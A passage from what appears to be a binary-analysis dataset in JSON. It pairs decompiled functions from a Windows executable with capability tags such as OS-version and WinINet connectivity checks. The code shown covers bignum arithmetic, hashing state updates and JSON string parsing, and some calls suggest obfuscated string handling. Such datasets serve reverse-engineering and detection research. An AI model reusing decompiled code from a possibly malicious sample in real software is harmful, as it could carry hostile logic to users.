        "decompiled_code": "\nuint32_t __cdecl fcn.0040d0be(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t *puVar5;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_10h < 0x20) {\n        var_8h = 0;\n        uVar2 = arg_10h;\n        var_4h = arg_14h;\n        uVar1 = var_8h;\n        if (arg_14h != 0) {\n            puVar5 = arg_ch + arg_14h * 4;\n            do {\n                var_4h = var_4h - 1;\n                puVar5 = puVar5 + -1;\n                uVar1 = (*puVar5 & ~(-1 << (uVar2 & 0x1f))) << (0x20 - uVar2 & 0x1f);\n                *((arg_8h - arg_ch) + puVar5) = *puVar5 >> (uVar2 & 0x1f) | var_8h;\n                var_8h = uVar1;\n            } while (var_4h != 0);\n        }\n    }\n    else {\n        uVar3 = 0;\n        uVar1 = arg_10h >> 5;\n        if (arg_14h != 0) {\n            puVar4 = arg_ch + uVar1 * 4;\n            do {\n                if (uVar3 + uVar1 < arg_14h) {\n                    *(arg_8h + uVar3 * 4) = *puVar4;\n                }\n                else {\n                    *(arg_8h + uVar3 * 4) = 0;\n                }\n                uVar3 = uVar3 + 1;\n                puVar4 = puVar4 + 1;\n            } while (uVar3 < arg_14h);\n        }\n        arg_10h = arg_10h & 0x1f;\n        uVar1 = *(arg_ch + -4 + uVar1 * 4) >> arg_10h;\n        if (arg_10h != 0) {\n            uVar3 = fcn.0040d0be(arg_8h, arg_8h, arg_10h, arg_14h);\n            uVar1 = uVar1 | uVar3;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 591
    },
    "0040d32f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040d32f(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    if (param_2 == 0) {\n        return -1;\n    }\n    uVar1 = 1;\n    if (1 < param_2) {\n        do {\n            if (param_1[uVar1] != 0) {\n                return 1;\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_2);\n    }\n    return (1 < *param_1) - (*param_1 == 0);\n}\n",
        "token_count": 147
    },
    "0040d4e1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040d4e1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_10h_00;\n    int32_t arg_ch_00;\n    int32_t arg_18h;\n    int32_t iVar1;\n    int32_t arg_ch_01;\n    int32_t arg_8h_01;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint unaff_ESI;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040bd94();\n    arg_10h_00 = fcn.0040bd94();\n    arg_ch_00 = fcn.0040bd94();\n    arg_18h = fcn.0040bd94();\n    iVar1 = fcn.0040bd94();\n    arg_ch_01 = fcn.0040bd94();\n    arg_8h_01 = fcn.0040bd94();\n    iVar2 = fcn.0040bd94();\n    fcn.0040cfe1();\n    fcn.0040cfad(arg_ch);\n    fcn.0040cfc5();\n    fcn.0040cfad(arg_10h);\n    var_1ch = 1;\n    iVar3 = fcn.0040cf47(arg_18h);\n    iVar4 = var_1ch;\n    if (iVar3 == 0) {\n        do {\n            var_1ch = iVar4;\n            fcn.0040cb05(arg_8h_01, arg_ch_01, arg_10h_00, unaff_ESI, arg_18h, unaff_ESI);\n            fcn.0040ca3a(arg_8h_01, arg_ch_00, unaff_ESI);\n            fcn.0040c9ae(iVar2);\n            fcn.0040cfad(arg_ch_00);\n            fcn.0040cfad(iVar1);\n            fcn.0040cfad(arg_18h);\n            fcn.0040cfad(arg_ch_01);\n            iVar3 = fcn.0040cf47(arg_18h);\n            iVar4 = -var_1ch;\n        } while (iVar3 == 0);\n        if (0 < var_1ch) {\n            fcn.0040c9e9(arg_8h_00, unaff_ESI);\n            goto code_r0x0040d620;\n        }\n    }\n    fcn.0040cfad(arg_8h_00);\ncode_r0x0040d620:\n    iVar4 = fcn.0040d32f();\n    if (iVar4 != 0) {\n        fcn.0040cfc5();\n    }\n    if (arg_8h_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_ch_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (iVar1 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_10h_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_18h != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_ch_01 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_8h_01 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (iVar2 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    return iVar4 != 0;\n}\n",
        "token_count": 968
    },
    "0040dcdf": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040dcdf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_ECX;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    ulong uVar9;\n    uint uStack572;\n    uint var_234h;\n    uint var_230h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    uVar1 = fcn.0040cf7b();\n    if (uVar1 == 0) {\n        fcn.0040cfe1();\n    }\n    else {\n        if (uVar1 != 1) {\n            var_18h = NULL;\n            do {\n                if ((0x1f < var_18h) || (puVar4 = var_18h * 4 + 0x414484,  uVar1 <= *puVar4 && *puVar4 != uVar1)) break;\n                var_18h = var_18h + 1;\n            } while (var_18h < 0x8);\n            if (var_18h < 0x2) {\n                uVar2 = fcn.0040db8e(arg_8h, in_ECX, arg_ch, arg_10h);\n                return uVar2;\n            }\n            var_10h = in_EAX * 2;\n            var_ch = fcn.0040bd94();\n            var_1ch = fcn.0040bd94();\n            var_28h = fcn.0040bd94();\n            var_8h = fcn.0040bd94();\n            fcn.0040d48c(var_28h, in_ECX, in_ECX, arg_10h);\n            uVar1 = 1;\n            var_30h = var_18h + -1;\n            var_34h = 1 << (var_30h & 0x1f);\n            if (1 < var_34h) {\n                do {\n                    uVar2 = fcn.0040bd94();\n                    (&var_234h)[uVar1] = uVar2;\n                    fcn.0040cfad((&uStack572)[uVar1]);\n                    fcn.0040ca3a(var_28h, uVar2, in_EAX);\n                    fcn.0040cb05(var_1ch, uVar2, var_ch, var_10h, arg_10h, in_EAX);\n                    uVar1 = uVar1 + 1;\n                } while (uVar1 < var_34h);\n            }\n            var_2ch = 1;\n            uVar9 = fcn.0040cf67(arg_ch);\n            var_20h = uVar9;\n            puVar4 = (uVar9 >> 0x20) + -4 + var_20h * 4;\n            var_14h = 0x80000000;\n            do {\n                if ((var_14h & *puVar4) != 0) break;\n                var_14h = var_14h >> 1;\n            } while (var_14h != 0);\n            iVar6 = 0;\n            uVar1 = 0;\n            var_24h = 0;\n            if (var_20h != 0) {\n                var_18h = puVar4;\n                do {\n                    if (var_2ch == 0) {\n                        fcn.0040cda3(var_ch, var_8h, in_EAX);\n                        fcn.0040cb05(var_1ch, var_8h, var_ch, var_10h, arg_10h, in_EAX);\n                    }\n                    if (var_24h == 0) {\n                        if ((*var_18h & var_14h) != 0) {\n                            uVar1 = 1;\n                            var_24h = 1;\n                            iVar5 = var_20h;\n                            puVar4 = var_18h;\n                            uVar3 = var_14h;\n                            for (iVar7 = var_30h; iVar6 = var_30h,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                                if (uVar3 == 1) {\n                                    iVar5 = iVar5 + -1;\n                                    uVar3 = 0x80000000;\n                                    puVar4 = puVar4 + -1;\n                                }\n                                else {\n                                    uVar3 = uVar3 >> 1;\n                                }\n                                uVar1 = uVar1 * 2;\n                                if ((iVar5 != 0) && ((*puVar4 & uVar3) != 0)) {\n                                    uVar1 = uVar1 | 1;\n                                }\n                            }\n                            for (; (iVar6 != 0 && ((uVar1 & 1) == 0)); uVar1 = uVar1 >> 1) {\n                                iVar6 = iVar6 + -1;\n                            }\n                            uVar1 = uVar1 >> 1;\n                            goto code_r0x0040ded3;\n                        }\n                    }\n                    else {\n                        if (iVar6 != 0) {\n                            iVar6 = iVar6 + -1;\n                        }\ncode_r0x0040ded3:\n                        if (iVar6 == 0) {\n                            if (var_2ch == 0) {\n                                fcn.0040ca3a((&var_234h)[uVar1], var_8h, in_EAX);\n                                fcn.0040cb05(var_1ch, var_8h, var_ch, var_10h, arg_10h, in_EAX);\n                            }\n                            else {\n                                fcn.0040cfad((&var_234h)[uVar1]);\n                                var_2ch = 0;\n                            }\n                            iVar6 = 0;\n                            var_24h = 0;\n                        }\n                    }\n                    if (var_14h == 1) {\n                        var_20h = var_20h + -1;\n                        var_18h = var_18h + -1;\n                        var_14h = 0x80000000;\n                    }\n                    else {\n                        var_14h = var_14h >> 1;\n                    }\n                } while (var_20h != 0);\n                if (var_24h != 0) {\n                    if (var_2ch == 0) {\n                        fcn.0040ca3a((&var_234h)[uVar1], var_8h, in_EAX);\n                        fcn.0040cb05(var_1ch, var_8h, var_ch, var_10h, arg_10h, in_EAX);\n                    }\n                    else {\n                        fcn.0040cfad((&var_234h)[uVar1]);\n                    }\n                }\n            }\n            fcn.0040cfad(var_8h);\n            if (var_8h != 0) {\n                fcn.0040cfc5();\n            }\n            fcn.0040bda8();\n            if (var_28h != 0) {\n                fcn.0040cfc5();\n            }\n            fcn.0040bda8();\n            if (var_ch != 0) {\n                fcn.0040cfc5();\n            }\n            fcn.0040bda8();\n            if (var_1ch != 0) {\n                fcn.0040cfc5();\n            }\n            fcn.0040bda8();\n            if (1 < var_34h) {\n                piVar8 = &var_230h;\n                iVar6 = var_34h - 1;\n                do {\n                    if (*piVar8 != 0) {\n                        fcn.0040cfc5();\n                    }\n                    fcn.0040bda8();\n                    piVar8 = piVar8 + 1;\n                    iVar6 = iVar6 + -1;\n                } while (iVar6 != 0);\n            }\n            return 0;\n        }\n        fcn.0040d411(arg_8h, in_ECX, in_EAX, arg_10h);\n    }\n    return 1;\n}\n",
        "token_count": 1922
    },
    "0040e270": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e270(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uint *puVar3;\n    uint *unaff_ESI;\n    int32_t iVar4;\n    uint uVar5;\n    uint s;\n    uint var_4h;\n    \n    if (unaff_ESI == NULL) {\n        iVar4 = 3;\n    }\n    else if (unaff_ESI[0x43] == 0) {\n        iVar4 = 5;\n    }\n    else if (in_EAX < 0) {\n        iVar4 = 6;\n    }\n    else if (in_EAX < 0x1c) {\n        puVar1 = unaff_ESI + 0x46;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + 1;\n        unaff_ESI[0x47] = unaff_ESI[0x47] + (0xfffffffe < uVar2);\n        if (in_EAX == 1) {\n            if (unaff_ESI[0x5b] + 1 < 2) {\n                uVar5 = 0x30;\n                puVar3 = unaff_ESI + 0xfe;\n            }\n            else {\n                uVar5 = 0x40;\n                puVar3 = unaff_ESI + 0xde;\n            }\n            fcn.0040e036(puVar3, uVar5);\n        }\n        puVar1 = unaff_ESI + in_EAX * 2 + 0xefc;\n        iVar4 = fcn.0040f0c3(arg_8h, unaff_ESI + 0x4a, in_EAX, *puVar1, arg_ch, 0x1000 - unaff_ESI[in_EAX + 0xede], \n                             unaff_ESI[0x5a], *unaff_ESI, unaff_ESI + in_EAX * 0x80 + 0x5e);\n        if (iVar4 == 0) {\n            unaff_ESI[in_EAX + 0xede] = 0;\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 + 1;\n            puVar1[1] = puVar1[1] + (0xfffffffe < uVar2);\n            sub.ntdll.dll_memset(unaff_ESI + in_EAX * 0x80 + 0x5e, 0, 0x200);\n            iVar4 = 0;\n        }\n    }\n    else {\n        iVar4 = 7;\n    }\n    return iVar4;\n}\n",
        "token_count": 607
    },
    "0040e358": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e358(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint var_84h;\n    \n    iVar4 = arg_8h;\n    if (arg_8h == 0) {\n        return 3;\n    }\n    if (*(arg_8h + 0x10c) == 0) {\n        return 5;\n    }\n    if (arg_10h == 0) {\n        if (*(arg_8h + 0x3b78 + arg_ch * 4) < 0x1000) {\n            return 0;\n        }\n    }\n    else if (arg_ch == *(arg_8h + 0x174)) {\n        if (arg_ch == *(arg_8h + 0x16c) + 1) {\n            if (*(arg_8h + 0x3b78 + arg_ch * 4) == 0x400) {\n                if (*(arg_8h + 0x3bf4 + arg_ch * 8) != 0) {\n                    return 0;\n                }\n                if (*(arg_8h + 0x3bf0 + arg_ch * 8) != 0) {\n                    return 0;\n                }\n            }\n        }\n        else if ((1 < arg_ch) && (*(arg_8h + 0x3b78 + arg_ch * 4) == 0x400)) {\n            return 0;\n        }\n    }\n    arg_8h = 0;\n    if ((arg_10h != 0) && (arg_ch == *(iVar4 + 0x174))) {\n        arg_8h = 1;\n    }\n    iVar3 = fcn.0040e270(&var_84h, arg_8h);\n    if (iVar3 == 0) {\n        if (arg_8h == 1) {\n            puVar6 = &var_84h;\n            puVar7 = iVar4 + 8;\n            for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            return 0;\n        }\n        iVar5 = *(iVar4 + 0x16c) + 1;\n        iVar3 = arg_ch + 1;\n        if (((iVar5 <= arg_ch + 1) &&\n            (iVar3 = iVar5,  (*(iVar4 + 0x3bf0 + iVar5 * 8) | *(iVar4 + 0x3bf4 + iVar5 * 8)) == 0)) &&\n           (piVar1 = iVar4 + 0x3b78 + iVar5 * 4,  *piVar1 == 0)) {\n            *piVar1 = 0x400;\n        }\n        puVar2 = iVar4 + 0x3b78 + iVar3 * 4;\n        puVar6 = &var_84h;\n        puVar7 = iVar3 * 0x200 + 0x178 + (*puVar2 >> 3) + iVar4;\n        for (iVar5 = 0x20; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar2 = *puVar2 + 0x400;\n        if (*(iVar4 + 0x174) < iVar3) {\n            *(iVar4 + 0x174) = iVar3;\n        }\n        iVar4 = fcn.0040e358(iVar4, iVar3, arg_10h);\n        return iVar4;\n    }\n    return iVar3;\n}\n",
        "token_count": 914
    },
    "0040e73a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040e73a(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (in_EAX == NULL) {\n        iVar2 = 3;\n    }\n    else if (in_EAX[0x43] == 0) {\n        iVar2 = 5;\n    }\n    else {\n        if (in_EAX[0x48] != 1) {\n            iVar2 = 1;\n            if ((in_EAX[0x5d] != 1) && (iVar2 = 1,  0 < in_EAX[0x5d])) {\n                piVar1 = in_EAX + 0xedf;\n                iVar2 = 1;\n                do {\n                    if (*piVar1 != 0) break;\n                    iVar2 = iVar2 + 1;\n                    piVar1 = piVar1 + 1;\n                } while (iVar2 <= in_EAX[0x5d]);\n            }\n            iVar2 = fcn.0040e358(in_EAX, iVar2, 1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            fcn.0040e036(in_EAX + 2, 0x10);\n            fcn.0040e675();\n            if (param_1 != 0) {\n                sub.ntdll.dll_memcpy(param_1, in_EAX + 2, *in_EAX + 7 + (*in_EAX + 7 >> 0x1f & 7U) >> 3);\n            }\n            fcn.0040e5d2();\n            in_EAX[0x48] = 1;\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 399
    },
    "0040ef7a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ef7a(uint *arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    if (in_EAX == NULL) {\n        uVar4 = 9;\n    }\n    else if (arg_8h == NULL) {\n        uVar4 = 0xf;\n    }\n    else if (arg_ch < 0x100) {\n        puVar1 = arg_10h;\n        if ((arg_10h == NULL) && (puVar1 = fcn.00406338(0),  puVar1 == NULL)) {\n            uVar4 = 0x12;\n        }\n        else {\n            puVar3 = puVar1;\n            for (iVar2 = 0xb2; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *in_EAX;\n                in_EAX = in_EAX + 1;\n                puVar3 = puVar3 + 1;\n            }\n            fcn.0040e7df();\n            puVar3 = puVar1 + arg_ch * 0x20 + 0x92;\n            for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_8h = *puVar3;\n                puVar3 = puVar3 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            if (arg_10h == NULL) {\n                sub.ntdll.dll_memset(puVar1, 0, arg_ch * 0x80 + 0x2c8);\n                fcn.00406445();\n            }\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0x11;\n    }\n    return uVar4;\n}\n",
        "token_count": 439
    },
    "0040f0c3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040f0c3(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch, \n            uint arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    uint32_t in_EAX;\n    int32_t arg_10h_00;\n    uint32_t unaff_EDI;\n    uint var_2cch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0xf;\n    }\n    else if (arg_28h == 0) {\n        arg_8h = 10;\n    }\n    else if (unaff_EDI < 0x100) {\n        if (in_EAX < 0x100) {\n            if (arg_10h < 0x100) {\n                if (arg_1ch < 0x1001) {\n                    if (arg_24h - 1U < 0x200) {\n                        if (arg_ch == 0) {\n                            arg_8h = 0xd;\n                        }\n                        else {\n                            fcn.0040f013(&var_2cch, arg_ch, arg_14h, unaff_EDI, in_EAX, arg_18h, arg_1ch, arg_20h, \n                                         arg_24h, arg_28h);\n                            if (*0x42f1e4 != NULL) {\n                                (**0x42f1e4)(arg_8h, 0x4127f8, arg_ch, arg_10h, arg_14h);\n                            }\n                            arg_10h_00 = fcn.00406338(0);\n                            if (arg_10h_00 != 0) {\n                                arg_8h = fcn.0040ef7a(arg_8h, unaff_EDI, arg_10h_00);\n                                fcn.00406445();\n                            }\n                        }\n                    }\n                    else {\n                        arg_8h = 2;\n                    }\n                }\n                else {\n                    arg_8h = 0xc;\n                }\n            }\n            else {\n                arg_8h = 0xb;\n            }\n        }\n        else {\n            arg_8h = 0x10;\n        }\n    }\n    else {\n        arg_8h = 0x11;\n    }\n    return arg_8h;\n}\n",
        "token_count": 546
    },
    "0040f246": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * fcn.0040f246(uint param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    \n    pcVar2 = fcn.004092af(param_1);\n    if (pcVar2 != NULL) {\n        cVar1 = *pcVar2;\n        pcVar5 = pcVar2;\n        while (cVar1 != '\\0') {\n            uVar3 = fcn.00405e30(0x412884, 0xe, 0x63e27b5d, 0);\n            iVar4 = (*_sym.imp.SHLWAPI.dll_StrChrA)(uVar3, *pcVar5);\n            if (iVar4 != 0) {\n                *pcVar5 = '_';\n            }\n            pcVar5 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n        }\n    }\n    return pcVar2;\n}\n",
        "token_count": 219
    },
    "0040f2f7": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040f2f7(int32_t param_1, char param_2)\n\n{\n    if (param_1 != 0) {\n        do {\n            fcn.00406445();\n            if (*(param_1 + 0x18) == '\\0') {\n                fcn.00406445();\n                if (*(param_1 + 0x14) == 3) {\n                    fcn.00406445();\n                }\n                if (*(param_1 + 0x10) != 0) {\n                    fcn.0040f2f7(*(param_1 + 0x10), 1);\n                }\n            }\n            if (param_2 == '\\0') {\n                fcn.0040f4ec();\n                fcn.00406445();\n                return;\n            }\n            param_1 = *(param_1 + 8);\n            fcn.00406445();\n        } while (param_1 != 0);\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "0040f3b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f3b8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_2 + 0x10);\n    if (iVar1 == 0) {\n        *(param_2 + 0x10) = param_1;\n    }\n    else {\n        for (; *(iVar1 + 8) != 0; iVar1 = *(iVar1 + 8)) {\n        }\n        *(iVar1 + 8) = param_1;\n        *(param_1 + 0xc) = iVar1;\n    }\n    *(param_1 + 4) = param_2;\n    return;\n}\n",
        "token_count": 155
    },
    "0040f803": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0040f803(int32_t arg_8h, uint arg_ch, uint32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t var_18h;\n    uint8_t *var_14h;\n    uint8_t *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = fcn.00405e30(0x4128b4, 4, 0x516ada57, 0);\n    puVar3 = fcn.0040f6d6(uVar2);\n    if ((puVar3 != NULL) && (*puVar3 == 0x22)) {\n        *arg_10h = *arg_10h - 1;\n        if (*arg_10h != 0) {\n            var_8h = 0;\n            uVar1 = puVar3[1];\n            var_10h = puVar3 + 1;\n            while (((uVar1 != 0 && (*var_10h != 0x22)) && (*arg_10h != 0))) {\n                uVar4 = *arg_10h - 1;\n                *arg_10h = uVar4;\n                puVar7 = var_10h + 1;\n                uVar6 = var_8h + 1;\n                if (*var_10h == 0x5c) {\n                    if (var_10h[1] == 0x75) {\n                        puVar7 = var_10h + 6;\n                        uVar6 = uVar4;\n                        if (4 < uVar4) {\n                            uVar6 = 5;\n                        }\n                        iVar5 = -uVar6;\n                        var_8h = var_8h + 3;\n                    }\n                    else {\n                        puVar7 = var_10h + 2;\n                        iVar5 = -1;\n                        var_8h = var_8h + 1;\n                    }\n                    *arg_10h = uVar4 + iVar5;\n                    uVar6 = var_8h;\n                }\n                var_8h = uVar6;\n                var_10h = puVar7;\n                uVar1 = *var_10h;\n            }\n            puVar7 = fcn.00406338(0);\n            if (puVar7 != NULL) {\n                var_4h = 0;\n                var_14h = puVar7;\n                if (var_8h != 0) {\n                    do {\n                        puVar8 = puVar3 + 1;\n                        uVar6 = *puVar8;\n                        if (*puVar8 == 0x5c) {\n                            puVar8 = puVar3 + 2;\n                            uVar1 = *puVar8;\n                            if (uVar1 == 0x62) {\n                                *puVar7 = 8;\n                                goto code_r0x0040fa57;\n                            }\n                            if (uVar1 == 0x66) {\n                                *puVar7 = 0xc;\n                                goto code_r0x0040fa57;\n                            }\n                            if (uVar1 == 0x6e) {\n                                *puVar7 = 10;\n                                goto code_r0x0040fa57;\n                            }\n                            if (uVar1 == 0x72) {\n                                *puVar7 = 0xd;\n                                goto code_r0x0040fa57;\n                            }\n                            if (uVar1 == 0x74) {\n                                *puVar7 = 9;\n                                goto code_r0x0040fa57;\n                            }\n                            if (uVar1 != 0x75) {\n                                *puVar7 = uVar1;\n                                goto code_r0x0040fa57;\n                            }\n                            uVar2 = fcn.00405e30(0x4128cc, 3, 0xbfabafdc, 0);\n                            iVar5 = fcn.00409647(uVar2, &var_ch);\n                            if (((iVar5 == 0) || ((puVar8 = puVar3 + 6,  0xdbff < var_ch && (var_ch < 0xe000)))) ||\n                               (var_ch == 0)) goto code_r0x0040fa58;\n                            if ((var_ch != 0xfe) && (var_ch != 0xff)) {\n                                var_4h = var_4h + 2;\n                                uVar6 = var_ch;\n                                goto code_r0x0040f8d6;\n                            }\n                            if (var_ch - 0xd800 < 0x400) {\n                                if ((puVar3[7] == 0x5c) && (puVar3[8] == 0x75)) {\n                                    uVar2 = fcn.00405e30(0x4128cc, 3, 0xbfabafdc, 0);\n                                    iVar5 = fcn.00409647(uVar2, &var_18h);\n                                    if ((iVar5 != 0) && (puVar8 = puVar3 + 0xc,  var_18h - 0xdc00 < 0x400)) {\n                                        var_ch = (var_18h & 0x3bf | 0x40) << 10 | var_18h & 0x3ff;\n                                        goto code_r0x0040f9ef;\n                                    }\n                                }\n                            }\n                            else {\ncode_r0x0040f9ef:\n                                if (var_ch < 0x80) {\n                                    uVar6 = 1;\n                                    uVar4 = uVar6;\n                                }\n                                else if (var_ch < 0x800) {\n                                    uVar6 = 2;\n                                    uVar4 = uVar6;\n                                }\n                                else {\n                                    uVar6 = 4 - (var_ch < 0x10000);\n                                    uVar4 = uVar6;\n                                }\n                                for (; 1 < uVar6; uVar6 = uVar6 - 1) {\n                                    puVar7[uVar6 - 1] = var_ch & 0x3f | 0x80;\n                                    var_ch = var_ch >> 6;\n                                }\n                                *puVar7 = *(uVar4 + 0x414000) | var_ch;\n                                puVar7 = puVar7 + uVar4;\n                                var_4h = var_4h + uVar4;\n                            }\n                        }\n                        else {\ncode_r0x0040f8d6:\n                            *puVar7 = uVar6;\ncode_r0x0040fa57:\n                            puVar7 = puVar7 + 1;\n                        }\ncode_r0x0040fa58:\n                        var_4h = var_4h + 1;\n                        puVar3 = puVar8;\n                    } while (var_4h < var_8h);\n                }\n                *puVar7 = 0;\n                uVar2 = 0;\n                iVar5 = fcn.00408f25(var_14h, puVar7 - var_14h, &var_18h);\n                if (iVar5 != 0) {\n                    uVar2 = 